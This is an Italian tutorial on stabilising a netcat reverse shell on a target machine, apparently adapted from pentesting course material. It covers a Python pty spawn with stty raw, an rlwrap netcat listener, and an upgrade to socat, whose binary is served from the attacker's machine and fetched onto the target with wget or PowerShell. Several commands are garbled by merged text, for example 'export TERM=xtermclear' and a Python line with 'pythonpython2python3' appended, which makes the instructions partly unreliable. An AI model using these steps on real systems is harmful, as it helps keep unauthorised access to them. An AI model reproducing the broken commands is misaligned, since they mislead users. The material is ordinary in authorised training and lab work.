Abbiamo una connessione ad una shell netcat e adesso?

Queste shell sono molto fragile (ES: con crtl+c killa la connessione) e non dispongono di tutti i comandi, ma, possiamo renderla piu stabile e piu manegevole con alcune tecniche

# TECNICA 1: PYTHON

La prima tecnica di cui parleremo è **applicabile** solo alle caselle **Linux** , poiché avranno quasi sempre Python installato di default. Si tratta di un processo in tre fasi:

1. La prima cosa da fare è usare **`python -c 'import pty;pty.spawn("/bin/bash")'pythonpython2python3`**, che usa Python per generare una shell bash con funzionalità migliori; nota che alcuni target potrebbero aver bisogno della versione di Python specificata. Se questo è il caso, sostituisci con o come richiesto. A questo punto la nostra shell apparirà un po' più carina, ma non saremo ancora in grado di usare il completamento automatico con Tab o i tasti freccia, e Ctrl + C ucciderà comunque la shell.
2. Il secondo passo è: **`export TERM=xtermclear,`** questo ci darà accesso a comandi terminologici come **clear**
3. Infine (e più importante) metteremo in background la shell usando Ctrl + Z. Tornati nel nostro terminale, usiamo **`stty raw -echo; fg`**. Questo fa due cose: prima, disattiva il nostro echo del terminale (**che ci dà accesso al completamento automatico tramite tab, ai tasti freccia e a Ctrl + C per terminare i process**i). Quindi mette in primo piano la shell, completando così il processo.

# La tecnica completa può essere vista qui:

![image](https://github.com/user-attachments/assets/189b7ed4-1d42-4dd7-858f-27f78f8e435e)

**NB:** Se la shell muore, qualsiasi input nel tuo terminale non sarà visibile (come risultato della disattivazione dell'echo del terminale). Per risolvere questo problema, digita resete premi invio.

# *Technique 2: rlwrap*

**rlwrap** è un programma che, in parole povere, ci dà **accesso** alla **cronologia**, al **completamento automatico tramite Tab** e ai **tasti freccia** immediatamente **dopo** aver **ricevuto** una **shell** *;* tuttavia, è comunque necessario ricorrere ad *una certa* stabilizzazione manuale se si desidera poter usare Ctrl + C all'interno della shell. **rlwrap non è installato di default su Kali,** quindi installalo prima con **`sudo apt install rlwrap`**.

Per utilizzare rlwrap, invochiamo un listener leggermente diverso:

- **`rlwrap nc -lvnp <port>`**

Aggiungere "**rlwrap**" al nostro listener netcat ci dà una shell molto più completa. Questa **tecnica** è particolarmente **utile** quando si ha a che fare con **shell Windows**, che altrimenti sono notoriamente difficili da stabilizzare. Quando si ha a che fare con un target Linux, è possibile stabilizzare completamente, usando lo stesso trucco del passaggio tre della tecnica precedente: mettere in background la shell con Ctrl + Z, quindi usare **`stty raw -echo; fg`**per stabilizzare e rientrare nella shell.

# *Tecnica 3: Socat*

Il terzo modo semplice per stabilizzare una shell è semplicemente **usare** una **shell netcat** iniziale **come trampolino** di lancio **verso** una **shell socat più completa**. Tieni presente che questa tecnica è **limitata** ai **target Linux**, poiché una shell Socat su Windows non sarà più stabile di una shell netcat. Per realizzare questo metodo di stabilizzazione, trasferiremmo prima un [binario compilato statico socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (una versione del programma compilata per non avere dipendenze) sulla macchina target. Un modo tipico per ottenere questo risultato sarebbe usare un webserver sulla macchina attaccante all'interno della directory contenente il tuo binario socat ( **`sudo python3 -m http.server 80`**), quindi, sulla macchina target, usare la shell netcat per scaricare il file. Su Linux questo sarebbe realizzato con curl o wget ( **`wget <LOCAL-IP>/socat -O /tmp/socat`**).

Per completezza: in un ambiente Windows CLI la stessa cosa può essere fatta con Powershell, usando Invoke-WebRequest o una classe di sistema webrequest, a seconda della versione di Powershell installata ( **`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`** )

Con una qualsiasi delle tecniche sopra descritte, è utile poter modificare la dimensione tty del terminale. Questa è una cosa che il terminale farà automaticamente quando si usa una shell normale; tuttavia, deve essere fatta manualmente in una shell reverse o bind se si vuole usare qualcosa come un editor di testo che sovrascrive tutto sullo schermo.

Per prima cosa, apri un altro terminale ed esegui **`stty -a`**. Questo ti darà un ampio flusso di output. Annota i valori per "rows" e columns:

![image](https://github.com/user-attachments/assets/0261c3a3-e4fd-47a0-9849-a643eb29c1df)

Successivamente, nella shell reverse/bind, digita:

**`stty rows <number>`**

E

**`stty cols <number>`**

Inserisci i numeri ottenuti eseguendo il comando nel tuo terminale.

Ciò modificherà la larghezza e l'altezza registrate del terminale, consentendo così ai programmi come gli editor di testo che si basano sull'accuratezza di tali informazioni di aprirsi correttamente.



